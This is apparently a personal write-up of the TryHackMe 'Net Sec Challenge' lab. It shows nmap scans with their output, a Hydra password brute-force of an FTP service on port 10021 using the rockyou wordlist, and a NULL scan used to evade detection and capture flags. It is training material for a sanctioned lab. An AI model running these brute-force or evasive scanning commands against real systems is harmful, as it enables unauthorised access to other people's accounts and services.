---
parent: "[[CTFs - THM]]"
resources:
---

```bash
# PLATFORM          . THM
# CTF NAME          . Net Sec Challenge
# DESCRIPTION       . Practice the skills you have learned in the Network Security module.
# DIFFICULTY        . Medium
# CTF LINK          . https://tryhackme.com/room/netsecchallenge
```

________________________________________________

- Since this is a challenge designed around nmap and Hydra, I started by scanning the target for both TCP and UDP open ports

`sudo nmap -sSUVC -p- 10.10.52.227 -T4 -oG CTF`

```bash
# scan output

Host is up (0.11s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946{REDACTED}39}
| ssh-hostkey: 
|   3072 da5f69e2111f7c6680896154e87b16f3 (RSA)
|   256 3f8c0946ab1cdfd73583cf6d6e177e1c (ECDSA)
|_  256 eda93aaa4c6b16e60d437546fb33b229 (ED25519)
80/tcp    open  http        lighttpd
|_http-server-header: lighttpd THM{web{REDACTED}5352}
|_http-title: Hello, world!
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8080/tcp  open  http        Node.js (Express middleware)
|_http-title: Site doesn\'t have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
10021/tcp open  ftp         vsftpd 3.0.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.93%I=7%D=10/10%Time=652565F1%P=x86_64-pc-linux-gnu%r(NUL
SF:L,29,\"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n\");
Service Info: OS: Unix

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-10T14:55:51
|_  start_date: N/A
|_nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.94 seconds

```


- From this output alone, we can answer several questions

		- What is the highest port number being open less than 10,000? : 8080
		- There is an open port above 10,000. What is it? : 10021
		- How many TCP ports are open? : 6
		- What is the flag hidden in the HTTP server header? : THM{we{REDACTED}5352}
		- What is the flag hidden in the SSH server header? : THM{94{REDACTED}3339}
		- What is the version of the FTP server? : vsftpd 3.0.3

- The next step of the challenge provides us two usernames, `eddie` and `quinn` and asks for the flag located in a file hosted on the FTP service, but we don't know the password for these accounts.

- I have brute-forced the FTP service (located on custom port `10021`) by using

`hydra -l [username] -P /usr/share/wordlists/rockyou.txt 10.10.52.227 ftp -s 10021`

- The password for `eddie` is `j{REDACTED}n`.
- The password for `quinn` is `a{REDACTED}a`.

- We can connect to `ftp` using both accounts to check for the file using

`ftp username@10.10.52.227 -p 10021`

- Once we find the file, it can be retrieved using `get [filename]`.

- The flag is `THM{32{REDACTED}67098}`.


- The last challenge was to scan the endpoint again, but this  time by monitoring the detection rate located on the webserver (`port 8080`). 

- I tried several nmap scan types, including Stealth SYN Scan, decreasing the Timing / modifying the performance, but it seems that only `NULL Scan` would reveal the flag.

`nmap -sN -n 10.10.52.227`

- The flag is THM{f7{REDACTED}99} 


I'd say this is a very easy challenge to verify your basic nmap understanding. It was fun, but simple. :) 